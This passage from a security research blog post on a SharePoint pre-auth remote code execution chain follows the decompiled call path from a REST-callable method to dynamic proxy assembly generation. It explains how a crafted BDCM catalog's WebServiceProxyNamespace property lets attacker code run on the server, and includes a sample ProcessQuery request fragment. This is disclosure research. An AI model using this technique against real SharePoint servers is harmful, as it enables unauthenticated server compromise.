</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">throw</span></span> <span class="k"><span class="hljs-keyword">new</span></span> <span class="n">InvalidOperationException</span><span class="p">(</span><span class="s"><span class="hljs-string">"ClientCall execute for DotNetAssembly lobSystem is not allowed."</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">m_entity</span><span class="p">.</span><span class="n">Execute</span><span class="p">(</span><span class="n">methodInstance</span><span class="p">,</span> <span class="n">lobSystemInstance</span><span class="p">,</span> <span class="k"><span class="hljs-keyword">ref</span></span> <span class="n">array</span><span class="p">);</span> <span class="c1"><span class="hljs-comment">// [27]</span></span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>At [24], since the method has the <code>[ClientCallableMethod]</code> attribute, the method is accessible via SharePoint REST APIs. There is a check at <strong>[26]</strong> to ensure that the <code>SystemType</code> of the <code>LobSystem</code> is not be equals to <code>SystemType.DotNetAssembly</code> before calling <code>this.m_entity.Execute()</code> at <strong>[27]</strong>.</p>
<p>However, there is a small hurdle at this point ‚Äì at <strong>[25]</strong>, how does one obtain a valid reference of <code>LobSystemInstance</code> and supply it as an argument via REST API? It turns out that using the Client Query feature, it is possible to reference the desired <code>LobSystemInstance</code> through the use of <code>ObjectIdentity</code>, which is constructed by <code>BCSObjectFactory</code>. Essentially, using the Client Query feature allows invoking of any methods with the <code>[ClientCallableMethod]</code> attribute, and allow supplying of non-trivial arguments like object references.</p>
<p>For example, a request can be made to <code>/_vti_bin/client.svc/ProcessQuery</code> with the following request body to obtain a reference of the desired <code>LobSystemInstance</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml hljs" data-lang="xml"><span class="line"><span class="cl"><span class="nt"><span class="hljs-tag">&lt;<span class="hljs-name">Identity</span></span></span><span class="hljs-tag"> </span><span class="na"><span class="hljs-tag"><span class="hljs-attr">Id</span>=</span></span><span class="s"><span class="hljs-tag"><span class="hljs-string">"17"</span></span></span><span class="hljs-tag"> </span><span class="na"><span class="hljs-tag"><span class="hljs-attr">Name</span>=</span></span><span class="s"><span class="hljs-tag"><span class="hljs-string">"&lt;random guid&gt;|4da630b6-36c5-4f55-8e01-5cd40e96104d:lsifile:jHRORCVc,jHRORCVc"</span></span></span><span class="hljs-tag"> </span><span class="nt"><span class="hljs-tag">/&gt;</span></span>
</span></span></code></pre></div><p>The static values used in the above payload are explained below:</p>
<ul>
<li><code>4da630b6-36c5-4f55-8e01-5cd40e96104d</code> refers to the type ID used by <code>BCSObjectFactory.GetObjectById()</code>.</li>
<li><code>lsifile</code> will return the <code>LobSystemInstance</code> from <code>BDCMetaCatalog</code> file</li>
</ul>
<p><code>BDCMetaCatalog</code> refers to the Business Data Connectivity Metadata (BDCM) catalog, and <code>LobSystem</code> and <code>Entity</code> objects are stored within the BDCM catalog. The data of BDCM catalog can either be stored in the database or in a file located at <code>/BusinessDataMetadataCatalog/BDCMetadata.bdcm</code> rooted at the SharePoint site URL.</p>
<p>While analyzing <code>BCSObjectFactory.GetObjectById()</code>, it was discovered that it is possible to construct and obtain a reference of the <code>LobSystem</code>, <code>LobSystemInstance</code> and <code>Entity</code> from a BDCM catalog file.</p>
<p>Luckily, it is possible to write to the BDCM catalog file. This would mean that arbitrary <code>LobSystem</code> objects can be inserted, and arbitrary <code>Property</code> objects within the <code>LobSystem</code> object, such as the <code>WebServiceProxyNamespace</code> property, can be specified. Consequently, code injection via the <code>WebServiceProxyNamespace</code> property of the <code>LobSystem</code> object allows arbitrary code to be injected into the <code>Assembly</code> generated.</p>
<p>Going back to <strong>[27]</strong>, <code>this.m_entity</code> can be an instance of <code>Microsoft.SharePoint.BusinessData.MetadataModel.Dynamic.DataClass</code> or <code>Microsoft.SharePoint.BusinessData.MetadataModel.Static.DataClass</code>. Regardless, both methods will eventually call  <code>Microsoft.SharePoint.BusinessData.Runtime.DataClassRuntime.Execute()</code>.</p>
<p>Subsequently, <code>DataClassRuntime.Execute()</code> will call <code>DataClassRuntime.ExecuteInternal()</code> -&gt; <code>ExecuteInternalWithAuthNFailureRetry()</code> -&gt; <code>WebServiceSystemUtility.ExecuteStatic()</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp hljs" data-lang="csharp"><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="k"><span class="hljs-function"><span class="hljs-keyword">override</span></span></span><span class="hljs-function"> </span><span class="k"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function"><span class="hljs-title">ExecuteStatic</span></span></span><span class="p"><span class="hljs-function">(</span></span><span class="n"><span class="hljs-function"><span class="hljs-params">IMethodInstance</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">methodInstance</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">ILobSystemInstance</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">lobSystemInstance</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">object</span></span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">[]</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">args</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">IExecutionContext</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">context</span></span></span><span class="p"><span class="hljs-function">)</span></span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(!</span><span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">initialized</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">Initialize</span><span class="p">(</span><span class="n">lobSystemInstance</span><span class="p">);</span> <span class="c1"><span class="hljs-comment">// [28]</span></span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="kt"><span class="hljs-keyword">object</span></span> <span class="n">obj</span> <span class="p">=</span> <span class="n">lobSystemInstance</span><span class="p">.</span><span class="n">CurrentConnection</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt"><span class="hljs-keyword">bool</span></span> <span class="n">flag</span> <span class="p">=</span> <span class="n">obj</span> <span class="p">!=</span> <span class="k"><span class="hljs-literal">null</span></span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(!</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">try</span></span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">obj</span> <span class="p">=</span> <span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">connectionManager</span><span class="p">.</span><span class="n">GetConnection</span><span class="p">();</span> <span class="c1"><span class="hljs-comment">// [29]</span></span>
</span></span><span class="line"><span class="cl">      <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>		
</span></span></code></pre></div><p>At <strong>[28]</strong>, <code>WebServiceSystemUtility.Initialize()</code> will be called:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp hljs" data-lang="csharp"><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">protected</span></span></span><span class="hljs-function"> </span><span class="k"><span class="hljs-function"><span class="hljs-keyword">virtual</span></span></span><span class="hljs-function"> </span><span class="k"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function"><span class="hljs-title">Initialize</span></span></span><span class="p"><span class="hljs-function">(</span></span><span class="n"><span class="hljs-function"><span class="hljs-params">ILobSystemInstance</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">lobSystemInstance</span></span></span><span class="p"><span class="hljs-function">)</span></span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">INamedPropertyDictionary</span> <span class="n">properties</span> <span class="p">=</span> <span class="n">lobSystemInstance</span><span class="p">.</span><span class="n">GetProperties</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">connectionManager</span> <span class="p">=</span> <span class="n">ConnectionManagerFactory</span><span class="p">.</span><span class="n">Value</span><span class="p">.</span><span class="n">GetConnectionManager</span><span class="p">(</span><span class="n">lobSystemInstance</span><span class="p">);</span> <span class="c1"><span class="hljs-comment">// [30]</span></span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>At <strong>[30]</strong>, <code>ConnectionManagerFactory.Value.GetConnectionManager(lobSystemInstance)</code> will initialise and return the <code>ConnectionManager</code> for the current <code>LobSystem</code> instance. With <code>WebServiceSystemUtility</code>, <code>this.connectionManager</code> will be an instance of <code>WebServiceConnectionManager</code>.</p>
<p>The relevant code of <code>WebServiceConnectionManager</code> is shown below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp hljs" data-lang="csharp"><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="k"><span class="hljs-function"><span class="hljs-keyword">override</span></span></span><span class="hljs-function"> </span><span class="k"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function"><span class="hljs-title">Initialize</span></span></span><span class="p"><span class="hljs-function">(</span></span><span class="n"><span class="hljs-function"><span class="hljs-params">ILobSystemInstance</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">forLobSystemInstance</span></span></span><span class="p"><span class="hljs-function">)</span></span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">dynamicWebServiceProxyType</span> <span class="p">=</span> <span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">GetDynamicProxyType</span><span class="p">(</span><span class="n">forLobSystemInstance</span><span class="p">);</span> <span class="c1"><span class="hljs-comment">// [31]</span></span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">loadController</span> <span class="p">=</span> <span class="n">LoadController</span><span class="p">.</span><span class="n">GetLoadController</span><span class="p">(</span><span class="n">forLobSystemInstance</span><span class="p">)</span> <span class="k"><span class="hljs-keyword">as</span></span> <span class="n">LoadController</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">protected</span></span></span><span class="hljs-function"> </span><span class="k"><span class="hljs-function"><span class="hljs-keyword">virtual</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function">Type</span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function"><span class="hljs-title">GetDynamicProxyType</span></span></span><span class="p"><span class="hljs-function">(</span></span><span class="n"><span class="hljs-function"><span class="hljs-params">ILobSystemInstance</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">forLobSystemInstance</span></span></span><span class="p"><span class="hljs-function">)</span></span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">Type</span> <span class="n">type</span> <span class="p">=</span> <span class="k"><span class="hljs-literal">null</span></span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">Assembly</span> <span class="n">proxyAssembly</span> <span class="p">=</span> <span class="n">ProxyAssemblyCache</span><span class="p">.</span><span class="n">Value</span><span class="p">.</span><span class="n">GetProxyAssembly</span><span class="p">(</span><span class="n">forLobSystemInstance</span><span class="p">.</span><span class="n">GetLobSystem</span><span class="p">());</span> <span class="c1"><span class="hljs-comment">// [32]</span></span>
</span></span><span class="line"><span class="cl">  <span class="n">INamedPropertyDictionary</span> <span class="n">properties</span> <span class="p">=</span> <span class="n">forLobSystemInstance</span><span class="p">.</span><span class="n">GetProperties</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>At <strong>[31]</strong>, <code>WebServiceConnectionManager.Initialize()</code> calls <code>WebServiceConnectionManager.GetDynamicProxyType()</code>, which calls <code>ProxyAssemblyCache.GetProxyAssembly()</code> at <strong>[32]</strong>, to retrieve a <code>Type</code> within the generated <code>Assembly</code> and store within <code>this.dynamicWebServiceProxyType</code>.</p>
<p>At <strong>[32]</strong>, <code>ProxyAssemblyCache.GetProxyAssembly()</code> will call the <code>ICompositeAssemblyProvider.GetCompositeAssembly()</code> with a <code>LobSystem</code> instance as argument. In this context, <code>compositeAssemblyProvider</code> is an instance of <code>LobSystem</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp hljs" data-lang="csharp"><span class="line"><span class="cl"><span class="n">CompositeAssembly</span> <span class="n">ICompositeAssemblyProvider</span><span class="p">.</span><span class="n">GetCompositeAssembly</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">CompositeAssembly</span> <span class="n">compositeAssembly</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">ISystemProxyGenerator</span> <span class="n">systemProxyGenerator</span> <span class="p">=</span> <span class="n">Activator</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">SystemUtilityType</span><span class="p">)</span> <span class="k"><span class="hljs-keyword">as</span></span> <span class="n">ISystemProxyGenerator</span><span class="p">;</span> <span class="c1"><span class="hljs-comment">// [33]</span></span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">proxyGenerationResult</span> <span class="p">=</span> <span class="n">systemProxyGenerator</span><span class="p">.</span><span class="n">GenerateProxyAssembly</span><span class="p">(</span><span class="k"><span class="hljs-keyword">this</span></span><span class="p">,</span> <span class="k"><span class="hljs-keyword">base</span></span><span class="p">.</span><span class="n">GetProperties</span><span class="p">());</span> <span class="c1"><span class="hljs-comment">// [34]</span></span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>At <strong>[33]</strong>, an instance of <code>WebServiceSystemUtility</code> is stored in <code>systemProxyGenerator</code>, so <code>WebServiceSystemUtility.GenerateProxyAssembly()</code> is subsequently called at <strong>[34]</strong>.
At this point, since the <code>LobSystem</code> is initialised using the crafted <code>BDCMetadataCatalog</code> file, the attacker has control over the properties of the <code>LobSystem</code> and hence is able to inject arbitrary code within the generated <code>Assembly</code>!</p>
<p>After returning from  <code>ProxyAssemblyCache.GetProxyAssembly()</code> at <strong>[32]</strong> , a <code>Type</code> within the generated <code>Assembly</code> will be returned and stored into <code>this.dynamicWebServiceProxyType</code>.
<code>WebServiceConnectionManager.GetConnection()</code> will be called at <strong>[29]</strong> after <code>WebServiceSystemUtility.Initialize()</code> at <strong>[28]</strong>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp hljs" data-lang="csharp"><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="k"><span class="hljs-function"><span class="hljs-keyword">override</span></span></span><span class="hljs-function"> </span><span class="kt"><span class="hljs-function"><span class="hljs-keyword">object</span></span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function"><span class="hljs-title">GetConnection</span></span></span><span class="p"><span class="hljs-function">(<span class="hljs-params"></span>)</span></span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl">  <span class="k"><span class="hljs-keyword">try</span></span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">httpWebClientProtocol</span> <span class="p">=</span> <span class="p">(</span><span class="n">HttpWebClientProtocol</span><span class="p">)</span><span class="n">Activator</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="k"><span class="hljs-keyword">this</span></span><span class="p">.</span><span class="n">dynamicWebServiceProxyType</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="c1"><span class="hljs-comment">//...</span></span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>This method directly creates a new object instance of the type specified in <code>this.dynamicWebServiceProxyType</code>, which executes the injected (malicious) code earlier on at <strong>[18]</strong>.</p>
<p>Chaining the two bugs together, an unauthenticated attacker is able to achieve remote code execution (RCE) on the target SharePoint server.
üòÅ.</p>
<p><img loading="lazy" src="./[P2O Vancouver 2023] SharePoint Pre-Auth RCE chain (CVE-2023‚Äì29357 &amp; CVE-2023‚Äì24955) _ STAR Labs_files/09-SharePoint-Pre-Auth-RCE-chain_reality.png" alt="Plan Vs Reality">
</p>
<p>There are many other interesting things which I found out during the process, but the length of the article is too long.</p>
<p>I will probably combine it in another article later.</p>
<p>Thank you for reading!</p>
<p>Thanks <a href="https://x.com/Creastery">Ngo Wei Lin</a>, <a href="https://x.com/CurseRed">Li Jiantao</a> &amp; <a href="https://x.com/Chocologicall">Poh Jia Hao</a> for reviewing and enriching this nasty blog post. Thanks to <a href="https://x.com/thezdi">ZDI</a> for spending time to review the contents as well.</p>
<h2 id="demo">Demo<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/09-sharepoint-pre-auth-rce-chain/#demo">#</a></h2>

<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
  <iframe src="./[P2O Vancouver 2023] SharePoint Pre-Auth RCE chain (CVE-2023‚Äì29357 &amp; CVE-2023‚Äì24955) _ STAR Labs_files/x0DPpVh8fO4.html" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen="" title="YouTube Video"></iframe>
</div>



  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>¬© 2025 <a href="https://starlabs.sg/">STAR Labs</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="https://starlabs.sg/blog/2023/09-sharepoint-pre-auth-rce-chain/#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z"></path>
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>



</body></html>